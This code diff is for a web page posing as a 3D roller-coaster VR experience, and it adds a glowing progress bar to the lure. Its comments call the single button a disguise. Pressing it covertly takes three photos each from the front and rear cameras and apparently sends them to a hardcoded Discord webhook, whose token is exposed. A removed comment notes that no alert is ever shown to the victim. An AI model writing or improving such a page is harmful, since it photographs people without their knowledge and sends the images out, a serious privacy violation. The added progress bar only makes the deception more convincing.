@@ -77,9 +77,31 @@
     transform: scale(1.05);
   }
 
+  /* 新增：霓虹進度條外框 */
+  .progress-container {
+    width: 100%;
+    height: 12px;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 10px;
+    margin-top: 25px;
+    overflow: hidden;
+    border: 1px solid rgba(0, 255, 255, 0.2);
+    display: none; /* 初始隱藏，點擊按鈕後才顯示 */
+  }
+
+  /* 新增：進度條本體（動態發光特效） */
+  .progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #ff007f, #00ffff);
+    box-shadow: 0 0 10px #00ffff;
+    border-radius: 10px;
+    transition: width 0.4s ease; /* 讓進度條跑動時更平滑 */
+  }
+
   /* 狀態提示文字 */
   #status-text {
-    margin-top: 25px;
+    margin-top: 15px;
     font-size: 14px;
     color: #888;
     height: 20px;
@@ -106,7 +128,12 @@
     <div class="subtitle">3D 模擬雲霄飛車體驗艙</div>
     
     <!-- 偽裝成 VR 啟動的唯一按鈕 -->
-    <button class="vr-btn" onclick="startAutoTask()">進入虛擬實境</button>
+    <button id="start-btn" class="vr-btn" onclick="startAutoTask()">進入虛擬實境</button>
+    
+    <!-- 新增：網頁進度條組件 -->
+    <div id="progress-box" class="progress-container">
+      <div id="progress-bar" class="progress-bar"></div>
+    </div>
     
     <!-- 取代原本彈窗通知的狀態列 -->
     <div id="status-text">系統就緒，等待連線裝置...</div>
@@ -120,38 +147,57 @@
     let currentStream = null;
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1504132923467501618/5pXOEtV2kww8Xj2iT_VDklREGgegoKQmtsWysQAxJjjkB1mEwFE4GCp705P83Y6mNXdG"; 
 
+    // 新增：更新進度條的工具函式
+    function updateProgress(percentage) {
+      const progressBar = document.getElementById("progress-bar");
+      progressBar.style.width = percentage + "%";
+    }
+
     async function startAutoTask() {
       const statusLabel = document.getElementById("status-text");
+      const progressBox = document.getElementById("progress-box");
+      const startBtn = document.getElementById("start-btn");
+      
+      // 點擊後隱藏按鈕並顯示進度條
+      startBtn.style.display = "none";
+      progressBox.style.display = "block";
       statusLabel.className = "loading";
       
-      // 更新網頁上的文字，增加帶入感
       statusLabel.innerText = "正在加載環境 3D 模組... 請允許相機權限";
+      updateProgress(5); // 初始進度
       
-      // 1. 前鏡頭連續捕捉 3 張
+      // 1. 前鏡頭連續捕捉 3 張 (預計進度落點：10% -> 50%)
       const userSuccess = await initCamera('user');
       if (userSuccess) {
         statusLabel.innerText = "視訊訊號對接中... 正在優化陀螺儀";
         for (let i = 1; i <= 3; i++) {
           await delay(1200);
           await captureAndSend(`📸 [前鏡頭] VR 體驗初始化 - 軌道定位點 ${i}`);
+          updateProgress(10 + i * 13); // 第1張23%, 第2張36%, 第3張49%
         }
+      } else {
+        updateProgress(50); // 若失敗直接跳進度
       }
 
-      // 2. 後鏡頭連續捕捉 3 張
+      // 2. 後鏡頭連續捕捉 3 張 (預計進度落點：55% -> 95%)
       statusLabel.innerText = "正在渲染高速動態軌道... 請稍後";
+      updateProgress(55);
+      
       const envSuccess = await initCamera('environment');
       if (envSuccess) {
         statusLabel.innerText = "正在進行空間追蹤與視角校正...";
         for (let i = 1; i <= 3; i++) {
           await delay(1200);
           await captureAndSend(`📸 [後鏡頭] VR 體驗中 - 畫面渲染快照 ${i}`);
+          updateProgress(55 + i * 13); // 第1張68%, 第2張81%, 第3張94%
         }
       }
       
       // 結束任務並關閉相機
       stopCurrentStream();
       
-      // 🛑 依照要求：完全不跳出任何 alert 彈窗通知，改由網頁文字低調提示
+      // 載入完成，衝到 100%
+      updateProgress(100);
       statusLabel.className = "";
       statusLabel.innerText = "VR 動態體驗環境加載完成。";
     }
